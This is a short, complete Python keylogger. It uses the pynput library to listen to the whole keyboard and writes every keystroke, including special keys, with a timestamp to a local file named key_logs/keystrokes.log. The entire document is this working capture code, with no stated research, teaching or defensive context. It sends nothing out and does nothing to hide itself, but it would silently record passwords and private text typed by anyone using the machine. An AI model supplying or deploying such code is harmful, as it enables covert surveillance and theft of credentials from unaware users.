from pynput import keyboard
import logging
import os

log_dir = "key_logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, "keystrokes.log")
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(f"Key: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
